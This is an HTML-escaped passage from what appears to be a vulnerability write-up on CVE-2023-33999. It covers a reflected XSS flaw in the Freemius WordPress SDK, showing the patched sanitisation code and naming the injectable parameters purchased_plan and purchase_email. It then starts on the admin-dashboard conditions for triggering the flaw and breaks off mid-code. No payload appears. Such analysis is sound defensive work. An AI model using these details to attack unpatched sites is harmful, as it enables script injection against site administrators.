class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;fs_sanitize_input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$input&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$input&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$input&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;fs_sanitize_input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Allow&amp;ensp;empty&amp;ensp;values&amp;ensp;to&amp;ensp;pass&amp;ensp;through&amp;ensp;as-is,&amp;ensp;like&amp;ensp;`null`,&amp;ensp;`&amp;#39;&amp;#39;`,&amp;ensp;`0`,&amp;ensp;`&amp;#39;0&amp;#39;`&amp;ensp;etc.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$input&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$input&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$input&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$input&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;fs_request_get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$def&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$type&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;fs_sanitize_input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;fs_request_get_raw&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$def&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$type&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch separates &lt;strong&gt;data retrieval&lt;/strong&gt; and &lt;strong&gt;data sanitization&lt;/strong&gt; into two distinct steps.&#xA;&lt;code&gt;fs_request_get_raw()&lt;/code&gt; only retrieves the raw value from GET/POST/REQUEST and removes escaping with &lt;code&gt;wp_unslash()&lt;/code&gt;, while &lt;code&gt;fs_sanitize_input()&lt;/code&gt; is responsible for sanitizing (even when the input is an array) using &lt;code&gt;sanitize_text_field()&lt;/code&gt;. Finally, &lt;code&gt;fs_request_get()&lt;/code&gt; always returns sanitized data. As a result, malicious data is no longer returned directly, reducing the risk of &lt;strong&gt;Reflected XSS&lt;/strong&gt; exploitation.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;code&gt;fs_request_get()&lt;/code&gt; function is called in many places.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-05-cve-2023-33999/call.png&#34; title=&#34;127 references&#34; data-thumbnail=&#34;/posts/2025-12-05-cve-2023-33999/call.png&#34; data-sub-html=&#34;&lt;h2&gt;Call&lt;/h2&gt;&lt;p&gt;127 references&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-05-cve-2023-33999/call.png&#39; alt=&#34;Call&#34; height=&#34;165&#34; width=&#34;702&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;127 references&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;so the tracing process is somewhat time-consuming.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-05-cve-2023-33999/search.png&#34; title=&#34;Locations where fs_request_get is called&#34; data-thumbnail=&#34;/posts/2025-12-05-cve-2023-33999/search.png&#34; data-sub-html=&#34;&lt;h2&gt;Search&lt;/h2&gt;&lt;p&gt;Locations where fs_request_get is called&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-05-cve-2023-33999/search.png&#39; alt=&#34;Search&#34; height=&#34;663&#34; width=&#34;1616&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Locations where fs_request_get is called&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The &lt;code&gt;dynamic_init()&lt;/code&gt; function calls &lt;code&gt;fs_request_get()&lt;/code&gt; to retrieve the values of keys such as &lt;code&gt;purchased_plan&lt;/code&gt; and &lt;code&gt;purchase_email&lt;/code&gt; from the request, and then uses these values to display a license purchase confirmation message in the admin page. These values are not sanitized before being included in the displayed content, leading to the risk that user-controlled data can inject malicious code and cause a &lt;strong&gt;Reflected Cross-Site Scripting (XSS)&lt;/strong&gt; vulnerability.&lt;/p&gt;&#xA;&lt;p&gt;For this message to appear, 3 conditions must be met:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;The request must be called from the Admin Dashboard&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;is_user_in_admin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;/**&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&amp;ensp;Check&amp;ensp;if&amp;ensp;a&amp;ensp;real&amp;ensp;user&amp;ensp;is&amp;ensp;visiting&amp;ensp;the&amp;ensp;admin&amp;ensp;dashboard.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&amp;ensp;@author&amp;ensp;Vova&amp;ensp;Feldman&amp;ensp;(@svovaf)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&amp;ensp;@since&amp;ensp;&amp;ensp;1.1.7&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&amp;ensp;@return&amp;ensp;bool&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*/&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;is_user_in_admin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_admin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;is_ajax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;is_cron&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;is_admin_post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Check whether the user has already connected (opted-in) to Freemius.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;is_registered&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;/**&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&amp;ensp;Check&amp;ensp;if&amp;ensp;user&amp;ensp;has&amp;ensp;connected&amp;ensp;his&amp;ensp;account&amp;ensp;(opted-in).&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&amp;ensp;Note:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;If&amp;ensp;the&amp;ensp;user&amp;ensp;opted-in&amp;ensp;and&amp;ensp;opted-out&amp;ensp;on&amp;ensp;a&amp;ensp;later&amp;ensp;stage,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;this&amp;ensp;will&amp;ensp;still&amp;ensp;return&amp;ensp;true.&amp;ensp;If&amp;ensp;you&amp;ensp;want&amp;ensp;to&amp;ensp;check&amp;ensp;if&amp;ensp;the&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;user&amp;ensp;is&amp;ensp;currently&amp;ensp;opted-in,&amp;ensp;use:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;`$fs-&amp;gt;is_registered()&amp;ensp;&amp;amp;&amp;amp;&amp;ensp;$fs-&amp;gt;is_tracking_allowed()`&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&amp;ensp;@author&amp;ensp;Vova&amp;ensp;Feldman&amp;ensp;(@svovaf)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&amp;ensp;@since&amp;ensp;&amp;ensp;1.0.1&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&amp;ensp;@param&amp;ensp;bool&amp;ensp;$ignore_anonymous_state&amp;ensp;Since&amp;ensp;2.5.1&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*&amp;ensp;@return&amp;ensp;bool&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;*/&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;is_registered&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$ignore_anonymous_state&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;_user&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;is_premium&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$ignore_anonymous_state&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 